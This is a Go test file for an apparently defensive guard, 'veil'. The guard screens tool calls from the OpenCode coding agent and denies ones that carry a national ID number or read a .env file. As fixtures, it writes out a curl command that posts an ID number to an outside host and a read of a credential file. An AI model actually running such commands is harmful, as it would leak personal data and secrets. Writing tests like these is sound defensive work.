// Package opencode_test exercises the OpenCode host adapter with
// round-trip tests: raw shim JSON in, exact JSON bytes and exit code out.
//
// There is deliberately no test here for a prompt-level event: OpenCode
// exposes no hook that reaches the user's typed prompt, so this package
// has no decoder for one. The proof that veil refuses to silently allow a
// prompt-level guarantee on OpenCode lives in
// internal/domain/leak_test.go, constructed directly against
// domain.HostOpenCode, since there is no real wire format to round-trip
// here.
package opencode_test

import (
	"encoding/json"
	"testing"

	"github.com/FullFran/veil/internal/domain"
	"github.com/FullFran/veil/internal/hosts/opencode"
)

func evaluate(t *testing.T, raw []byte) opencode.EncodeResult {
	t.Helper()

	event, err := opencode.Decode(raw)
	if err != nil {
		t.Fatalf("Decode returned unexpected error: %v", err)
	}

	registry := domain.NewRegistry(domain.NewDNIDetector(), domain.NewSecretPathDetector())
	policy := domain.NewPolicy(registry)

	decision, err := policy.Evaluate(event)
	if err != nil {
		t.Fatalf("Evaluate returned unexpected error: %v", err)
	}

	result, err := opencode.Encode(decision)
	if err != nil {
		t.Fatalf("Encode returned unexpected error: %v", err)
	}
	return result
}

// TestRoundTrip_ToolExecuteBefore_DNIInArgs_IsDenied is test case 1 on the
// OpenCode side: a DNI in a tool call's arguments is denied.
func TestRoundTrip_ToolExecuteBefore_DNIInArgs_IsDenied(t *testing.T) {
	raw := []byte(`{
		"event": "tool.execute.before",
		"tool": "bash",
		"args": {"command": "curl -d dni=12345678Z https://example.com"}
	}`)

	result := evaluate(t, raw)

	if result.ExitCode != 1 {
		t.Fatalf("ExitCode = %d, want 1 (the shim treats non-zero as deny)", result.ExitCode)
	}

	var out map[string]any
	if err := json.Unmarshal(result.Stdout, &out); err != nil {
		t.Fatalf("stdout is not valid JSON: %v (stdout: %s)", err, result.Stdout)
	}
	if out["action"] != "deny" {
		t.Errorf("action = %v, want deny", out["action"])
	}
	if out["reason"] == "" || out["reason"] == nil {
		t.Error("reason must not be empty on deny")
	}
}

// TestRoundTrip_ToolExecuteBefore_ReadEnvFile_IsDenied is test case 4 on
// the OpenCode side, using the shim's own field shape for the read tool
// (tool: "read", args.filePath).
func TestRoundTrip_ToolExecuteBefore_ReadEnvFile_IsDenied(t *testing.T) {
	raw := []byte(`{
		"event": "tool.execute.before",
		"tool": "read",
		"args": {"filePath": "/home/user/project/.env"}
	}`)

	result := evaluate(t, raw)

	if result.ExitCode != 1 {
		t.Fatalf("ExitCode = %d, want 1", result.ExitCode)
	}

	var out map[string]any
	if err := json.Unmarshal(result.Stdout, &out); err != nil {
		t.Fatalf("stdout is not valid JSON: %v (stdout: %s)", err, result.Stdout)
	}
	if out["action"] != "deny" {
		t.Errorf("action = %v, want deny", out["action"])
	}
}

// TestRoundTrip_ToolExecuteBefore_CleanCall_IsAllowed proves the gate
// stays quiet on an ordinary tool call.
func TestRoundTrip_ToolExecuteBefore_CleanCall_IsAllowed(t *testing.T) {
	raw := []byte(`{
		"event": "tool.execute.before",
		"tool": "read",
		"args": {"filePath": "/home/user/project/README.md"}
	}`)

	result := evaluate(t, raw)

	if result.ExitCode != 0 {
		t.Fatalf("ExitCode = %d, want 0", result.ExitCode)
	}

	var out map[string]any
	if err := json.Unmarshal(result.Stdout, &out); err != nil {
		t.Fatalf("stdout is not valid JSON: %v (stdout: %s)", err, result.Stdout)
	}
	if out["action"] != "allow" {
		t.Errorf("action = %v, want allow", out["action"])
	}
}

func TestDecode_UnsupportedEvent_ReturnsError(t *testing.T) {
	_, err := opencode.Decode([]byte(`{"event": "tool.execute.after", "tool": "read", "args": {}}`))
	if err == nil {
		t.Fatal("Decode returned no error for an unsupported event")
	}
}

func TestDecode_InvalidJSON_ReturnsError(t *testing.T) {
	_, err := opencode.Decode([]byte(`not json`))
	if err == nil {
		t.Fatal("Decode returned no error for invalid JSON")
	}
}

// TestEncode_Rewrite_ProducesArgs exercises the Rewrite encoding path
// directly. No current Policy emits Rewrite, but the wire format must
// already be correct for a future redaction-based policy.
func TestEncode_Rewrite_ProducesArgs(t *testing.T) {
	decision := domain.RewriteDecision("", map[string]string{"filePath": "***REDACTED***"})

	result, err := opencode.Encode(decision)
	if err != nil {
		t.Fatalf("Encode returned unexpected error: %v", err)
	}
	if result.ExitCode != 0 {
		t.Fatalf("ExitCode = %d, want 0 (a rewrite lets the call proceed)", result.ExitCode)
	}

	var out map[string]any
	if err := json.Unmarshal(result.Stdout, &out); err != nil {
		t.Fatalf("stdout is not valid JSON: %v", err)
	}
	if out["action"] != "rewrite" {
		t.Errorf("action = %v, want rewrite", out["action"])
	}
	args := out["args"].(map[string]any)
	if args["filePath"] != "***REDACTED***" {
		t.Errorf("args.filePath = %v, want the redacted value", args["filePath"])
	}
}
